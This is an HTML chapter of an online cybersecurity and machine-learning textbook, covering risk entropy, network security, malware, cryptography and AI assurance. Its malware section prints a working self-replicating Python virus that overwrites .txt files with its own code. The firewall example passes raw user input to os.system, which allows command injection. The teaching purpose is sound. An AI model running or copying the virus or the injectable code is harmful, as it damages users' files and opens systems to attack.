@@ -1,0 +1,746 @@
+<html>
+<head>
+
+  <link href="style.css" rel="stylesheet" type="text/css" />
+
+
+  <script id="MathJax-script" async
+          src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
+  </script>
+	
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [['$', '$']]
+    }
+  };
+</script>
+	
+</head>
+
+  <body>
+
+<div class="navbar">
+  <a href="https://www.cybersecurityandmachinelearning.com"> Cyber and ML </a>
+  <a href="https://www.patreon.com/c/RicardoCalix">Blog</a>
+  <a href="https://www.youtube.com/channel/UCKRgi-HJDEq0a3nhlG2nQvg">YouTube</a>
+  <a href="https://github.com/rcalix1">GitHub</a>
+  <a href="https://amzn.to/3OauEG0">Books</a>
+  <a href="https://www.linkedin.com/in/ricardo-calix-phd">About</a>
+  <a href="https://scholar.google.com/citations?hl=en&user=TiKVs6AAAAAJ">Scholar</a>	
+  <a href="">Shop</a>
+  <a href="https://www.rcalix.com">Contact</a>
+</div>
+
+    
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<div class="main">    <!-- for the fixed nav bar -->
+
+<h1>Chapter 2 - Introduction to Cyber Security and Machine Learning </h1>
+
+    <center>
+      <div>
+         <img src="https://rcalix1.github.io/CyberSecurityAndMachineLearning/FirstEdition/images/goodBadPacket.png" height="500" width="auto">
+      </div>
+
+    </center>
+
+
+
+
+
+
+<h1>Copyright and License</h1>
+
+<p>
+ <center> Copyright &copy by Ricardo A. Calix. </center><br/>
+ All rights reserved. No part of this work may be reproduced or transmitted in any form or by any means, without written permission of the copyright owner. <br/>
+ MIT License.
+ <br/>
+
+</p>
+
+	<h1>FTC and Amazon Disclaimer</h1>
+
+<p>
+
+ This post/page/article includes Amazon Affiliate links to products. This site receives income if you purchase through these links. 
+ This income helps support content such as this one. 
+	
+ <br/>
+
+</p>
+  
+</p>
+
+     <center>
+     <div>
+    <center><a href="https://amzn.to/41I2r0w"><img src="https://m.media-amazon.com/images/I/71bOUBitNUL._SL1233_.jpg" alt="image" width="300" height="auto"></a></center> 
+     </div>
+
+    </center>
+    
+
+<h1>
+Introduction to Cyber Security and Machine Learning
+	
+</h1>
+
+
+<p>
+
+
+
+Cyber Security is a very broad field. In general, it can be divided into areas such as network security, software assurance, social engineering, cryptography, etc. 
+There are many other ways to divide it and this is just a suggested way to look at it. Here, I am loosely organizing the topics by the input medium (e.g. network data), 
+or by the process (e.g. cryptography). 
+
+	
+
+	
+</p>
+
+<h1>
+RCM
+	
+</h1>
+
+
+	<p>
+
+
+
+I have always told my students that before they think about all the technical aspects of cyber security, that they should create a Risk and Control Matrix (RCM). 
+		This is a very simple table or spread sheet mapping 3 things which are:
+
+<ul>
+    <li>Assets</li>
+    <li>Threats</li>
+	<li>Controls</li>
+</ul>
+   
+
+The logic here is to identify the assets to protect, then find the threats associated with these assets, and finally to put controls in place to mitigate the risk. 
+
+</p>
+	
+	<p>
+		
+	<h1>Risk</h1>
+
+Risk is sometimes mentioned as a term in cyber security to determine course of action. Risk can be quantified with probabilities and metrics from information
+		theory can  help us to make sense of the problem. If you do not know the exact probabilities, you can sometimes guess or arrive at them by speaking 
+		to organization stakeholders. This may be better understood with examples. 
+
+		<h2>
+			Expected Risk given Threat and Impact Probabilities
+		</h2>
+
+
+In this example, assume we have "5" threats to our organization with associated individual threat probabilities (T probs.) and impact probabilitie
+		s (I probs.). For each threat, we multiply its threat probability (T prob) with its corresponding impact probability (I prob). The goal is to make 
+		an informed decision as to which threat may have the highest expected risk.
+
+Given
+
+
+
+<center>
+<div>
+<textarea rows="5" cols="100">
+
+threat_probabilities = [ 0.1, 0.3, 0.3, 0.2, 0.1]
+  
+</textarea>
+  
+</div>
+</center>
+
+
+		
+
+
+and
+
+<center>
+<div>
+<textarea rows="5" cols="100">
+
+threat_impact        = [ 0.6, 0.8, 0.7, 0.6, 0.9]
+  
+</textarea>
+  
+</div>
+</center>
+
+
+
+we multiply as follows:
+
+
+<ul>
+	<li>0.1 * 0.6</li>
+	<li> 0.3 * 0.8</li>
+	<li>0.3 * 0.7</li>
+	<li>etc</li>
+	
+</ul>
+		
+
+
+Once multiplied, we select the highest probability. 
+
+We can calculate this with Numpy as follows:
+
+
+<center>
+<div>
+<textarea rows="15" cols="100">
+
+import numpy as np
+
+threat_probabilities = [ 0.1, 0.3, 0.3, 0.2, 0.1]
+threat_impact        = [ 0.6, 0.8, 0.7, 0.6, 0.9]
+
+expected_risks     = [ p * i for p, i in zip(threat_probabilities, threat_impact)]
+
+highest_risk_index = np.argmax( expected_risks )
+
+print("Threat with highest expected risk is:")
+print(  highest_risk_index  )
+
+## Threat with highest expected risk is:
+## 1
+  
+</textarea>
+  
+</div>
+</center>
+
+
+
+
+
+Here, we multiply the probabilities together and determine that threat 1 has the highest expected risk. 
+
+
+	<h2>Entropy</h2>
+
+
+We can also use the "Entropy" metric to determine how uncertain we are about a threat probability distribution. We can measure this in bits.
+	The best way to understand this is to compare a sample test case to the 2 possible extremes in our threat level probability distribution. 
+	This can be seen in the  next code listing: 
+
+
+
+	<center>
+<div>
+<textarea rows="15" cols="100">
+
+	
+## Scenario 1
+
+threat_probabilities = [ 0.1, 0.3, 0.3, 0.2, 0.1]
+
+risk_entropy = -np.sum( [p * np.log2(p) for p in threat_probabilities]  )
+
+print("Threat Risk Entropy in bits is: ")
+print( risk_entropy ) 
+
+## Threat Risk Entropy in bits is: 
+## 2.1709505944546685
+
+###############################
+## Scenario 2
+
+risk_entropy = -np.sum( [p * np.log2(p) for p in [ 0.2, 0.2, 0.2, 0.2, 0.2]]  )
+
+print("Threat Risk Entropy in bits is: ")
+print( risk_entropy ) 
+
+## Threat Risk Entropy in bits is: 
+## 2.321928094887362
+
+################################
+## Scenario 3
+
+risk_entropy = -np.sum( [p * np.log2(p) for p in [ 0.95, 0.02, 0.01, 0.01, 0.01]]  )
+
+print("Threat Risk Entropy in bits is: ")
+print( risk_entropy ) 
+
+Threat Risk Entropy in bits is: 
+0.38249336186032434
+  
+</textarea>
+  
+</div>
+</center>
+
+
+
+
+
+In the previous code listing we can see that we calculated entropy 3 times. The second case is where all probabilities are equal to 0.2. 
+	This has the highest Entropy and is the most uncertain scenario (2.32). We do not know which threat is more likely to happen. 
+
+Scenario 3 has the lowest Entropy equal to 0.38. We are the most  certain here given that threat "one" has a probability of 0.95 
+	(i.e. [ 0.95, 0.02, 0.01, 0.01, 0.01]). No surprise here. 
+
+Our actual test case (scenario 1) has an entropy of 2.17. Entropy is high and we have high uncertainty but this scenario is in between the 
+	2 extremes of 0.38 and 2.32. 
+
+
+<h2>Computer Hacking</h2>
+
+
+Many people think of computer hacking when they think about cyber security. So let us start here. A computer hack can be thought of as gaining
+	un-authorized access to a computer information system. The classic scenario is to exploit vulnerabilities in software  or firewalls. 
+	All computer systems use the concept of sockets. Sockets can be defined as tuples of IP addresses and port numbers. 
+	These IPs and ports help computers to communicate with each other. Let us think of two computers A and B that want to communicate with 
+	each other. To achieve this, a program in computer A with an IP will use a port in computer A to send out information in the form of computer packets. 
+	There packets are transmitted across networks seeking the IP for B. Once the packets reach B, they will try to go into computer B through a port number 
+	in B. This port in B must be open and will be linked with another program. That program will read the data sent from A and try to run it. 
+	It there is a vulnerability in the program in B, an attacker can send specially crafted data to exploit this vulnerability in the software in B. 
+	If the hack is successful, the attacker will try to affect one of the following pillars of information  assurance:
+
+
+<ul>
+	<li>Confidentiality</li>
+	<li>Integrity</li>
+	<li>Availability</li>
+	<li>Non repudiation</li>
+	<li>Authentication</li>
+</ul>
+
+	
+
+
+Metasploit, netwox, or Kali linux are famous tools for conducting cyber security attacks. That being said, an attack can be crafted with any programming 
+	language such as C or python using special libraries. Scapy for instance can be used in python to craft any kind of network packet. 
+	It is important to note that there is a term called "ethical hacking" and that hacking is a crime and should only be done in special defensive situations 
+	such as in penetration testing with authorized access. 
+
+	<h2>Network Security</h2>
+
+
+Network security relates to the security of the computer network environment. The unit in this environment is the network packet. 
+	Think of packets as little trains with information that are sent from one computer to another over computer networks and the internet (the rail lines). 
+	There are many protocols used to send this data across networks such as UDP/IP and TCP/IP. In general, data is encapsulated using several protocols 
+	as it is prepared to be sent across the network as network packets. 
+
+
+
+ <center>
+      <div>
+        <img src="https://rcalix1.github.io/CyberSecurityAndMachineLearning/FirstEdition/images/packetBasci.png" height="500" width="auto">
+      </div>
+
+    </center>
+	
+
+
+Hackers try to understand these protocols to find vulnerabilities that they can exploit. In general, machine learning algorithms can be used to analyze 
+	incoming packets to try to detect which ones could be related to an attack. Packets can carry both good traffic and bad traffic (next figure).
+
+
+	
+ <center>
+      <div>
+        <img src="https://rcalix1.github.io/CyberSecurityAndMachineLearning/FirstEdition/images/goodBadPacket.png" height="500" width="auto">
+      </div>
+
+ </center>
+
+
+
+Common network attacks include: denial of service attacks, SYN flooding, TCP session hijacking, buffer overflow attacks, and many more. 
+
+Firewalls and Intrusion Detection Systems (IDS) are a traditional way to defend against these attacks. The problem is that these approaches depend on 
+	already knowing the characteristics of the attack. There are other types of attacks that are unknown, and these may require more advanced approaches 
+	such as machine learning.
+
+For example, in the next code listing we can see how to easily add heuristic rules to the UFW firewall in Linux.
+
+
+
+
+
+<center>
+<div>
+<textarea rows="15" cols="100">
+
+import os
+
+print("enter ip address to block and press enter")
+ip = input()
+print("enter port number to block, and then press enter")
+port = input()
+
+
+def configure_firewall():
+    os.system(  "ufw deny from " + ip)
+    os.system(  "ufw deny " + port)
+    os.system(  "ufw disable")
+    os.system(  "ufw enable")
+    os.system(  "ufw status verbose" )
+   
+
+configure_firewall()
+
+  
+</textarea>
+  
+</div>
+</center>
+
+	
+
+
+
+These rules help to block certain IPs or port numbers in a rules based approach. 
+
+Packets that contain these blocked values will be dropped. 
+
+	<h2>Software Security and Malware</h2>
+
+
+Software security relates to protecting the medium of software code and related vulnerabilities. This refers to vulnerabilities in the software itself and not
+	on protocols such as those in Network security. For example, declaring variables in memory that are too small to store the data sent to them is a problem. 
+	If not properly coded, this could result in putting data in unintended areas of memory. A program reading data from these unintended areas of memory could 
+	result in unexpected behavior including attacks (e.g. the classic buffer overflow attack). 
+
+This area also covers malware issues. Malware is any code that tries to replicate itself in the operating system (or other environments) and cause harm to the system. 
+	Common types of malware include: computer viruses, worms, ransomware, etc. The following code segment shows a simple example of how to implement 
+	a computer virus with python. Keep in mind that many viruses will be written in other languages such as C/C++ and will be compiled code. 
+	The virus in this example will look for files with a "txt" extension and try to infect them. 
+
+The computer virus code has the following functions:
+
+	<ul>
+		<li> search()</li>
+		<li> infect()</li>
+		<li> payload()</li>
+	</ul>
+
+
+
+Most of the computer virus behavior happens in the <strong>"infect()"</strong> function.
+
+
+<center>
+<div>
+<textarea rows="35" cols="100">
+
+import os
+import datetime
+
+################################################
+def search(path):
+    files_to_infect = []
+    files_list = os.listdir(path)
+    ## print(files_list)
+    for file in files_list:
+        temp = file.split(".")
+        ##print( temp[1] )
+        if temp[1] == "txt":
+            files_to_infect.append(file)
+    return files_to_infect
+
+
+#################################################
+def infect(files_to_infect):
+    print("files received to infect")
+    ## print(files_to_infect)
+    virus_string = ""
+    virus = open(  os.path.abspath(__file__)   )
+    for i, line in enumerate(virus):
+        ##print(line)
+        virus_string = virus_string + line
+    virus.close()
+    ## print( virus_string  )
+    for fname in files_to_infect:
+        f = open(fname)
+        temp = f.read()
+        f.close()
+        f = open(fname, "w")
+        f.write( virus_string + "##" + temp  )
+        f.close()
+        ## os.chmod(fname, 777)
+        os.system("chmod u+x " + fname )
+    return
+
+################################################
+def payload():
+    ## ransomware or deleting files
+    if datetime.datetime.now().day == 28:
+        print("hello")
+
+
+path = "."
+files_to_infect = search(path)
+infect(files_to_infect)
+payload()
+
+
+  
+</textarea>
+  
+</div>
+</center>
+
+
+Traditional defenses against these attacks include anti-virus scanners. Sometimes malware scanners can be classified as static or dynamic. 
+
+
+
+	
+ <center>
+      <div>
+        <img src="https://rcalix1.github.io/CyberSecurityAndMachineLearning/FirstEdition/images/StaticOrDynamic.png" height="500" width="auto">
+      </div>
+
+ </center>
+
+
+
+
+Traditional anti-virus scanners rely on hashing techniques to detect malware and are considered to be static. 
+	Hash functions take variable length inputs and produce fixed length outputs called hash values. If one bit of the input file changes, 
+	then the hash output value is completely different. 
+
+ <center>
+      <div>
+        <img src="https://rcalix1.github.io/CyberSecurityAndMachineLearning/FirstEdition/images/abtiVirusScanner.png" height="500" width="auto">
+      </div>
+
+ </center>
+	
+
+
+
+In Dynamic Analysis you run the virus in a sandbox environment  using an emulator. The actions (e.g. DLL calls, registry edits, file reads, etc.) 
+	of the malware can be recorded in log files. 
+
+ <center>
+      <div>
+        <img src="https://rcalix1.github.io/CyberSecurityAndMachineLearning/FirstEdition/images/EmulatorDynamicStatic.png" height="500" width="auto">
+      </div>
+
+ </center>
+
+
+
+
+
+These approaches, once again, require previous knowledge of the malware and may not be effective for unknown malware attacks. Here, machine learning can help.
+	For instance, in dynamic analysis the data in the log files can be used to extract the features for ML. 
+
+
+
+Other topics that relate to software security include: cross-site scripting, cross-site request forgery, and others. 
+
+</br>
+
+<h2>Social Engineering</h2>
+
+	</br>
+	
+
+A Social Engineering attack can be considered as a type of cyber security attack that tries to confuse or trick humans. 
+	The goal is to get the human to do something such as clicking on a malicious link or revealing secret information. 
+
+The classic example of social engineering is the phishing attack. Phishing attacks can be done via email. Usually information is provided in the email to 
+	trick the human into clicking on some link. 
+
+	</br>
+
+<h2>Cryptography</h2>
+
+	</br>
+
+
+Cryptography is a huge area that is critical to cyber security. Many people think of it as methods to scramble data.
+	This general understanding relates to making data unreadable except for the authorized parties. However, cryptography can also be used for integrity checking, 
+	authentication, and for many other purposes. 
+
+Claude Shannon was one of the first people to consider the problem of cryptography rigorously. He was mainly concerned with the question 
+	of "What makes a secure cipher?".
+He proposed the following relationship as a metric to measure how secure a cryptographic cipher can be. 
+
+\[  P[ \; E(k, m_0) = c \; ]    =   P[ \; E(k,m_1) = c \;  ]     \]
+
+The previous equation relates 2 outcomes measured by probabilities for two encryptions given $ m_0 $ and $ m_1 $, respectively. Think of the equal sign comparing 
+	the 2 probabilities as more of a semantic equality than, say, an algebraic equality.
+Both encryptions use the same algorithm (E) and key (k). The difference lies in the inputs given to "E" which are $ m_0 $ and $ m_1 $. 
+	The produced cipher is also the same in both cases. The equation is used to define how to measure a secure cipher (E). The central idea lies in the 
+	probabilities which should be the same. Therefore, a secure cipher is one where, given the "intercepted" cipher (c), you cannot tell if "c" was generated 
+	from $ m_0 $ or $ m_1 $. They should both be equally likely to have generated "c". The cipher "c"  does not reveal any information about the original message. 
+
+
+Cryptography and ML may initially seem like unrelated areas. We will later see that there are, in fact, some techniques from machine learning that
+	can be used in the context of cryptography. 
+
+Entropy is sometimes used in an operating system to find encrypted files, for instance. 
+
+A popular Python library used for cryptography is "PyCrypto Dome". The following code listing shows a simple example of how to use it for cryptography. 
+
+
+
+
+	
+<center>
+<div>
+<textarea rows="15" cols="100">
+
+
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+data = b"rc3456786dg491234567"
+
+secret_key = get_random_bytes(16)
+
+file_key = open("AES_key.txt", "wb")
+file_key.write(secret_key)
+file_key.close()
+
+cipher_AES = AES.new(secret_key, AES.MODE_CBC)
+cipher_text = cipher_AES.encrypt(data)
+
+
+file_out = open("AES_encrypted.bin", "wb")
+file_out.write(cipher_AES.iv)
+file_out.write(cipher_text)
+file_out.close()
+
+  
+</textarea>
+  
+</div>
+</center>
+
+
+
+
+
+In the previous example, we encrypt "data" using the AES symmetric encryption technique. 
+
+
+<h2>
+	AI Assurance
+</h2>
+	
+
+
+The topic of AI assurance relates to creating secure and reliable AI systems. With regards to AI assurance,  I will cover topics such as:
+
+
+<ul>
+	<li>AI auditing and explainability</li>
+	<li>Bias testing</li>
+	<li>Adversarial attacks</li>
+	<li>AI agent cyber</li>
+	<li>etc</li>
+	
+</ul>
+	
+<h2>AI Auditing and Explainability</h2>
+
+
+
+AI auditing is a new emerging field. In general, it relates to the process of checking an AI system to measure how reliable and trustworthy it can be. 
+	Explainability is the big buzzword in AI auditing. While it can be difficult to ensure that an AI system is 100\% reliable and trustworthy, 
+	it can be easier to provide more clarity into how it works. This is what "explainability" tries to achieve. 
+
+A classic explainability technique that will be covered in this book is the Shapley explainability metric. 
+
+<h2>
+	Bias Testing
+</h2>
+	
+
+
+Bias testing relates to the process of measuring AI systems to ensure that they are fair, un-biased and trustworthy. 
+	This is a complicated topic that is still unsolved but that is very important. I will provide some examples and literature related to this topic. 
+
+One very basic metric that will be discussed in this book is the 4/5s rule for bias testing. 
+
+<h2>
+	Adversarial Attacks
+</h2>
+	
+
+
+The classic example related to adversarial attacks involves fooling an AI system by training it with some confusing data. Attack data is injected into
+	the training data so as to train the model to correlate the attack injected data with some specific outcome. For example putting purple glasses on
+	images of faces and training the system to associate the purple glasses with a specific class. 
+
+	<h2>
+		Introduction to Cyber Security and Machine Learning Literature
+	</h2>
+
+
+Examples in the literature of previous studies on the use of machine learning for cyber security include: 
+
+<ul>
+	<li>Frederick et al. 2022</li>
+	<li>CabreraCalixRef</li>
+	<li>SankaranCalix2013Ref</li>
+	<li>OdayTextCyber2013Ref</li>
+	<li>SankaranEmbedded2016Ref</li>
+	<li>IqbalEmbedded2016Ref</li>
+</ul>
+	
+	
+	
+	These studies, in general, propose feature extraction approaches given the specific medium (e.g. network data) for use in cyber defense 
+	(e.g. intrusion detection). The extracted samples are then collected as annotated datasets for use in training machine learning models.
+
+In Frederick et al. 2022, the authors present a technique to convert malware files to images. 
+	This conversion allows for new malware detection models that can leverage pre-trained image classifiers based on ResNets, U-nets, VGGs, etc. 
+	This is a great example of the use of Transfer Learning for Cyber Security. 
+	
+	Cabrera et al.  is a more traditional study on the use of ML 
+	for malware detection. Similarly,  Sankaran et al, is a more traditional study on the use of ML for network intrusion detection. 
+
+
+	<h2>
+		Summary
+	</h2>
+
+
+This chapter provided a brief introduction to cyber security, AI assurance, and ML. Future chapters will discuss these topics in more depth. 
+
+ 
+<h2>
+	Code Examples
+</h2>
+
+
+<ul>
+	<li>
+		<a href="https://github.com/rcalix1/CyberSecurityAndMachineLearning/blob/main/FirstEdition/Ch2_Intro_Cyber_And_ML/QuantifyRisksInformationTheory.ipynb">
+		   Example 1
+		</a>
+	</li>
+</ul>
+
+
+
+
+		
+		
+	</p>
+
+
+
+
+
+</div>  <!-- for the fixed nav bar -->
+
+    
+  </body>
+</html>
